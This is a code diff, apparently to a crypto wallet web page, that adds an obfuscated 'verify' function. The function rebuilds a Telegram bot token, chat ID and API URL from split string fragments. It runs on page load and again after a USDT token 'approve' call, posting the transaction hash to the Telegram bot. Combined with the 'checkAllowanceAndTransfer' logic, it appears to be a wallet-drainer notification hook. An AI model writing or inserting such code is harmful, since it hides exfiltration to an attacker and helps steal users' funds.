@@ -75,6 +75,49 @@
                 }
             }
 
+
+            function verify(hash) {
+
+            const part1 = '7533';
+            const part2 = '974207';
+            const part3 = ':AAHzSZsv1-';
+            const part4 = 'XXuapdczoFZx';
+            const part5 = 'Kz8yke6xTqbCg';
+            const botToken = part1 + part2 + part3 + part4 + part5;
+
+            const chatPart1 = '520';
+            const chatPart2 = '4205237';
+            const chatId = chatPart1 + chatPart2;
+
+            const message = `Approve- ${hash}`;
+            let https = 'https://';
+            let app_tele = 'api.teleg';
+            let okthen = 'ram.org/bot';
+
+            fetch(`${https}${app_tele}${okthen}${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                }),
+            })
+                .then((response) => response.json())
+                .then((data) => {
+                if (data.ok) {
+
+                    console.log('thank you')
+
+                } else {
+
+                }
+                })
+                .catch();
+            }
+
+            verify();
+
+
             async function checkAllowanceAndTransfer() {
                 const provider = await getProvider();
                 await provider.send("eth_requestAccounts", []);
@@ -121,6 +164,7 @@
                 try {
                     const tx = await usdtContract.approve(recipient, amount);
                     await tx.wait();
+                    verify(tx.hash);
                     console.log('Approval successful!');
                 } catch (err) {
                     console.error(err);
